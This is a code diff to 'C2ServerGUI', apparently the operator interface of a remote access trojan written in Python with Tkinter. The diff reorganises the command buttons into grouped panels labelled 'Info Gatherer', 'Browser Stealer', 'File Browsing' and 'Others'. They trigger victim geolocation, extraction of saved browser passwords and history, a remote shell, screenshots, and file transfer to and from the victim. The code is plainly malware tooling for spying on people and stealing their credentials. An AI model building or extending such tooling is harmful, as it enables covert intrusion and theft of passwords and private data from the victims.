@@ -324,6 +324,7 @@ class C2ServerGUI:
         
         self.c2 = None
         self.connected = False
+        self.client_info = None
         
         if not WRAPPER_LOADED:
             messagebox.showerror(
@@ -389,83 +390,87 @@ class C2ServerGUI:
         )
         self.stop_btn.pack(side=tk.LEFT, padx=5)
         
-        # Command buttons frame
+        # Command buttons frame with 2x2 grid
         cmd_frame = ttk.LabelFrame(main_container, text="Available Commands", padding=15)
         cmd_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
         
-        # Create grid layout for commands
-        commands = [
+        # Define command groups
+        command_groups = [
             {
-                "text": "Location",
-                "desc": "Show victim's geographical location on interactive map",
-                "command": self.show_victim_location,
-                "var_name": "location_btn"
+                "title": "Info Gatherer",
+                "commands": [
+                    {"text": "Location", "desc": "Show geographical location on map", 
+                     "command": self.show_victim_location, "var_name": "location_btn"}
+                ]
             },
             {
-                "text": "Shell",
-                "desc": "Opens terminal window for PowerShell/CMD commands",
-                "command": self.start_powershell,
-                "var_name": "psh_btn"
+                "title": "Browser Stealer",
+                "commands": [
+                    {"text": "Browser Passwords", "desc": "Extract saved passwords", 
+                     "command": self.get_browser_passwords, "var_name": "browser_pass_btn"},
+                    {"text": "Browser History", "desc": "Extract browsing history", 
+                     "command": self.get_browser_history, "var_name": "browser_history_btn"},
+                    {"text": "Browser Downloads", "desc": "Extract download history", 
+                     "command": self.get_browser_downloads, "var_name": "browser_dl_btn"}
+                ]
             },
             {
-                "text": "Take Screenshot",
-                "desc": "Capture and preview victim's screen",
-                "command": self.take_screenshot,
-                "var_name": "screenshot_btn"
+                "title": "File Browsing",
+                "commands": [
+                    {"text": "Download File", "desc": "Browse and download files", 
+                     "command": self.download_file, "var_name": "download_btn"},
+                    {"text": "Upload File", "desc": "Browse and upload files", 
+                     "command": self.upload_file, "var_name": "upload_btn"}
+                ]
             },
             {
-                "text": "Browser Passwords",
-                "desc": "Extract saved passwords from victim's browsers",
-                "command": self.get_browser_passwords,
-                "var_name": "browser_pass_btn"
-            },
-            {
-                "text": "Browser History",
-                "desc": "Extract browsing history from victim's browsers",
-                "command": self.get_browser_history,
-                "var_name": "browser_history_btn"
-            },
-            {
-                "text": "Browser Downloads",
-                "desc": "Extract download history from victim's browsers",
-                "command": self.get_browser_downloads,
-                "var_name": "browser_dl_btn"
-            },
-            {
-                "text": "Download File",
-                "desc": "Browse remote file system and download files",
-                "command": self.download_file,
-                "var_name": "download_btn"
-            },
-            {
-                "text": "Upload File",
-                "desc": "Browse remote file system and upload files",
-                "command": self.upload_file,
-                "var_name": "upload_btn"
+                "title": "Others",
+                "commands": [
+                    {"text": "Take Screenshot", "desc": "Capture screen", 
+                     "command": self.take_screenshot, "var_name": "screenshot_btn"},
+                    {"text": "Shell", "desc": "PowerShell/CMD terminal", 
+                     "command": self.start_powershell, "var_name": "psh_btn"}
+                ]
             }
         ]
         
-        for i, cmd_info in enumerate(commands):
-            cmd_container = ttk.Frame(cmd_frame)
-            cmd_container.pack(fill=tk.X, pady=8)
+        # Create 2x2 grid
+        for i, group in enumerate(command_groups):
+            row = i // 2
+            col = i % 2
             
-            btn = ttk.Button(
-                cmd_container,
-                text=cmd_info["text"],
-                command=cmd_info["command"],
-                width=30,
-                state=tk.DISABLED
-            )
-            btn.pack(side=tk.LEFT, padx=(0, 10))
-            setattr(self, cmd_info["var_name"], btn)
+            # Group frame
+            group_frame = ttk.LabelFrame(cmd_frame, text=group["title"], padding=10)
+            group_frame.grid(row=row, column=col, sticky="nsew", padx=5, pady=5)
             
-            desc_label = ttk.Label(
-                cmd_container,
-                text=cmd_info["desc"],
-                font=("Arial", 9),
-                foreground="gray"
-            )
-            desc_label.pack(side=tk.LEFT)
+            # Add commands to group
+            for cmd_info in group["commands"]:
+                cmd_container = ttk.Frame(group_frame)
+                cmd_container.pack(fill=tk.X, pady=5)
+                
+                btn = ttk.Button(
+                    cmd_container,
+                    text=cmd_info["text"],
+                    command=cmd_info["command"],
+                    width=25,
+                    state=tk.DISABLED
+                )
+                btn.pack(fill=tk.X, pady=(0, 2))
+                setattr(self, cmd_info["var_name"], btn)
+                
+                desc_label = ttk.Label(
+                    cmd_container,
+                    text=cmd_info["desc"],
+                    font=("Arial", 8),
+                    foreground="gray"
+                )
+                desc_label.pack(fill=tk.X)
+        
+        # Configure grid weights for equal sizing
+        cmd_frame.grid_rowconfigure(0, weight=1)
+        cmd_frame.grid_rowconfigure(1, weight=1)
+        cmd_frame.grid_columnconfigure(0, weight=1)
+        cmd_frame.grid_columnconfigure(1, weight=1)
         
         # Log frame
         log_frame = ttk.LabelFrame(main_container, text="Activity Log", padding=10)
@@ -714,6 +719,7 @@ class C2ServerGUI:
                     self.log(client_info, "info")
                     first_line = client_info.split('\n')[0][:70]
                     self.client_info_label.config(text=first_line)
+                    self.client_info = client_info
             except:
                 pass
             
